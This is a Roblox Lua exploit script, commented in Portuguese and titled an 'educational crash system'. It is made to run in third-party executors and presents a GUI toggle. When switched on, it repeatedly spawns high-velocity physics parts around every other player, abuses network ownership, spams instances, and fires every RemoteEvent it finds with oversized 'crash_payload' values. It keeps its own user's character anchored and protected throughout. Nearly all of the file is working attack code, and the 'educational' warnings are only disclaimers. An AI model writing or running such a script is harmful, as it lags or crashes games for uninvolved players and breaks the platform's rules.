--== SISTEMA DE CRASH EDUCATIVO (PROTEGIDO) ==--
-- AVISO: APENAS PARA FINS EDUCACIONAIS EM AMBIENTES CONTROLADOS

local tweenService = game:GetService("TweenService")
local players = game:GetService("Players")
local player = players.LocalPlayer
local runService = game:GetService("RunService")
local debris = game:GetService("Debris")

-- Variáveis de estado
local isActive = false
local isMinimized = false
local activePlayers = {}

-- Criar ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PlayerCrashUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Proteção para diferentes executores
if syn and syn.protect_gui then
    syn.protect_gui(screenGui)
    screenGui.Parent = game:GetService("CoreGui")
elseif gethui then
    screenGui.Parent = gethui()
else
    screenGui.Parent = game:GetService("CoreGui")
end

-- Frame Principal
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 350, 0, 210)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -105)
mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

-- Borda arredondada
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 18)
corner.Parent = mainFrame

-- Borda preta sutil
local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(40, 40, 40)
mainStroke.Thickness = 2
mainStroke.Transparency = 0.3
mainStroke.Parent = mainFrame

-- Header
local header = Instance.new("Frame")
header.Name = "Header"
header.Size = UDim2.new(1, 0, 0, 60)
header.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
header.BorderSizePixel = 0
header.Parent = mainFrame

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 18)
headerCorner.Parent = header

-- Título
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -100, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.BackgroundTransparency = 1
title.Text = "⚡ CRASH EDUCATIVO"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

-- Botão Minimizar
local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Name = "MinimizeBtn"
minimizeBtn.Size = UDim2.new(0, 45, 0, 45)
minimizeBtn.Position = UDim2.new(1, -55, 0, 7.5)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
minimizeBtn.Text = "—"
minimizeBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
minimizeBtn.TextSize = 20
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.BorderSizePixel = 0
minimizeBtn.Parent = header

local minBtnCorner = Instance.new("UICorner")
minBtnCorner.CornerRadius = UDim.new(0, 12)
minBtnCorner.Parent = minimizeBtn

-- Container de conteúdo
local content = Instance.new("Frame")
content.Name = "Content"
content.Size = UDim2.new(1, -40, 1, -80)
content.Position = UDim2.new(0, 20, 0, 70)
content.BackgroundTransparency = 1
content.Parent = mainFrame

-- Status
local statusFrame = Instance.new("Frame")
statusFrame.Size = UDim2.new(1, 0, 0, 50)
statusFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
statusFrame.BorderSizePixel = 0
statusFrame.Parent = content

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 14)
statusCorner.Parent = statusFrame

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, -20, 1, 0)
statusText.Position = UDim2.new(0, 15, 0, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "Status: Desativado"
statusText.TextColor3 = Color3.fromRGB(220, 220, 220)
statusText.TextSize = 15
statusText.Font = Enum.Font.GothamBold
statusText.TextXAlignment = Enum.TextXAlignment.Left
statusText.Parent = statusFrame

-- Botão de Toggle
local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = "ToggleBtn"
toggleBtn.Size = UDim2.new(1, 0, 0, 55)
toggleBtn.Position = UDim2.new(0, 0, 0, 65)
toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 220, 120)
toggleBtn.Text = "ATIVAR CRASH"
toggleBtn.TextColor3 = Color3.fromRGB(5, 5, 10)
toggleBtn.TextSize = 18
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.BorderSizePixel = 0
toggleBtn.Parent = content

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 14)
toggleCorner.Parent = toggleBtn

-- SISTEMA DE PROTEÇÃO PARA VOCÊ
local function setupProtection()
    -- Ancora seu character para não ser afetado por físicas
    if player.Character then
        local humanoid = player.Character:FindFirstChild("Humanoid")
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        
        if root then
            root.Anchored = true
        end
        
        -- Cria um force field invisível ao seu redor
        local forceField = Instance.new("Part")
        forceField.Name = "PlayerProtection"
        forceField.Size = Vector3.new(20, 20, 20)
        forceField.Position = root.Position
        forceField.Transparency = 1
        forceField.Anchored = true
        forceField.CanCollide = false
        forceField.Parent = workspace
        
        -- Adiciona um corpo negativo para cancelar forças
        local negativeForce = Instance.new("BodyVelocity")
        negativeForce.Velocity = Vector3.new(0, 0, 0)
        negativeForce.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        negativeForce.Parent = root
        
        debris:AddItem(forceField, 0.1)
    end
    
    -- Conecta para proteger quando o character respawnar
    player.CharacterAdded:Connect(function(character)
        task.wait(1) -- Espera o character carregar
        local root = character:FindFirstChild("HumanoidRootPart")
        if root then
            root.Anchored = true
            
            local negativeForce = Instance.new("BodyVelocity")
            negativeForce.Velocity = Vector3.new(0, 0, 0)
            negativeForce.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            negativeForce.Parent = root
        end
    end)
end

-- FUNÇÃO DE CRASH QUE NÃO TE AFETA
local function remoteCrash()
    while isActive do
        for _, targetPlayer in pairs(players:GetPlayers()) do
            -- PULA VOCÊ MESMO - isso é crucial!
            if targetPlayer == player then 
                continue 
            end
            
            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = targetPlayer.Character.HumanoidRootPart
                
                -- Técnica 1: Partes com física extrema
                for i = 1, 30 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(0.1, 0.1, 0.1)
                    part.Position = hrp.Position + Vector3.new(
                        math.random(-50, 50),
                        math.random(10, 30),
                        math.random(-50, 50)
                    )
                    part.Transparency = 1
                    part.CanCollide = false
                    part.Anchored = false
                    
                    -- Força física MÁXIMA (só afeta outros)
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(
                        math.random(-3000, 3000),
                        math.random(-3000, 3000),
                        math.random(-3000, 3000)
                    )
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bv.Parent = part
                    
                    -- Força rotacional
                    local ba = Instance.new("BodyAngularVelocity")
                    ba.AngularVelocity = Vector3.new(
                        math.random(-5000, 5000),
                        math.random(-5000, 5000), 
                        math.random(-5000, 5000)
                    )
                    ba.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    ba.Parent = part
                    
                    part.Parent = workspace
                    debris:AddItem(part, 0.1)
                end
                
                -- Técnica 2: Network ownership attack
                for i = 1, 5 do
                    local netPart = Instance.new("Part")
                    netPart.Size = Vector3.new(2, 2, 2)
                    netPart.Position = hrp.Position
                    netPart.Transparency = 1
                    netPart.Anchored = false
                    
                    -- Remove network ownership (causa lag no target)
                    netPart:SetNetworkOwner(nil)
                    
                    local bodyForce = Instance.new("BodyForce")
                    bodyForce.Force = Vector3.new(0, 50000, 0)
                    bodyForce.Parent = netPart
                    
                    netPart.Parent = workspace
                    debris:AddItem(netPart, 0.2)
                end
            end
        end
        
        task.wait(0.05) -- Intervalo agressivo
    end
end

-- TÉCNICAS AVANÇADAS (SÓ PARA OUTROS)
local function advancedCrash()
    while isActive do
        for _, targetPlayer in pairs(players:GetPlayers()) do
            if targetPlayer == player then continue end -- Pula você
            
            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = targetPlayer.Character.HumanoidRootPart
                
                -- Spam de instâncias perto do target
                for i = 1, 20 do
                    local spamPart = Instance.new("Part")
                    spamPart.Size = Vector3.new(0.5, 0.5, 0.5)
                    spamPart.Position = hrp.Position + Vector3.new(
                        math.random(-10, 10),
                        math.random(0, 5),
                        math.random(-10, 10)
                    )
                    spamPart.Transparency = 0.8
                    spamPart.BrickColor = BrickColor.new("Bright red")
                    spamPart.Material = Enum.Material.Neon
                    spamPart.Anchored = true
                    spamPart.CanCollide = false
                    spamPart.Parent = workspace
                    debris:AddItem(spamPart, 1.0)
                end
                
                -- Tenta encontrar e spam remotes (se existirem)
                pcall(function()
                    local remotes = workspace:GetDescendants()
                    for _, obj in pairs(remotes) do
                        if obj:IsA("RemoteEvent") and isActive then
                            for i = 1, 3 do
                                obj:FireServer("crash_payload", math.huge, "educational")
                            end
                        end
                    end
                end)
            end
        end
        task.wait(0.1)
    end
end

-- INICIAR SISTEMA DE CRASH PROTEGIDO
local function startProtectedCrash()
    -- PRIMEIRO: Protege você
    setupProtection()
    
    -- DEPOIS: Inicia os sistemas de crash para outros
    spawn(remoteCrash)
    spawn(advancedCrash)
    
    -- Spam geral (evitando sua área)
    spawn(function()
        while isActive do
            for i = 1, 50 do
                if not isActive then break end
                local part = Instance.new("Part")
                part.Size = Vector3.new(0.1, 0.1, 0.1)
                
                -- Coloca longe de você
                if player.Character and player.Character.HumanoidRootPart then
                    part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(
                        math.random(-100, 100),
                        math.random(-50, 50),
                        math.random(-100, 100)
                    )
                else
                    part.Position = Vector3.new(
                        math.random(-100, 100),
                        math.random(10, 50),
                        math.random(-100, 100)
                    )
                end
                
                part.Transparency = 1
                part.Parent = workspace
                debris:AddItem(part, 0.05)
            end
            task.wait()
        end
    end)
end

-- PARAR SISTEMA E RESTAURAR
local function stopCrashSystem()
    -- Restaura seu character
    if player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            root.Anchored = false
            
            -- Remove forças negativas
            for _, obj in pairs(root:GetChildren()) do
                if obj:IsA("BodyVelocity") then
                    obj:Destroy()
                end
            end
        end
    end
end

-- TOGGLE FUNCTION
toggleBtn.MouseButton1Click:Connect(function()
    isActive = not isActive
    
    if isActive then
        -- ATIVAR
        statusText.Text = "Status: ATIVADO (Protegido)"
        statusText.TextColor3 = Color3.fromRGB(0, 255, 140)
        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
        toggleBtn.Text = "DESATIVAR CRASH"
        
        warn("[EDUCAÇÃO] Sistema ativado - VOCÊ ESTÁ PROTEGIDO")
        startProtectedCrash()
        
    else
        -- DESATIVAR
        statusText.Text = "Status: Desativado"
        statusText.TextColor3 = Color3.fromRGB(220, 220, 220)
        toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 220, 120)
        toggleBtn.Text = "ATIVAR CRASH"
        
        stopCrashSystem()
    end
end)

-- Minimizar
minimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    
    if isMinimized then
        tweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 350, 0, 60)}):Play()
        content.Visible = false
        minimizeBtn.Text = "+"
    else
        tweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 350, 0, 210)}):Play()
        content.Visible = true
        minimizeBtn.Text = "—"
    end
end)

-- Sistema de arrastar
local dragging = false
local dragInput, mousePos, framePos

header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        mousePos = input.Position
        framePos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - mousePos
        mainFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
    end
end)

-- AVISO INICIAL
warn("=== SISTEMA DE CRASH EDUCATIVO CARREGADO ===")
warn("VOCÊ ESTÁ PROTEGIDO - outros jogadores podem ser afetados")
warn("USO APENAS PARA EDUCAÇÃO EM JOGOS PRIVADOS")

-- Proteção inicial
setupProtection()
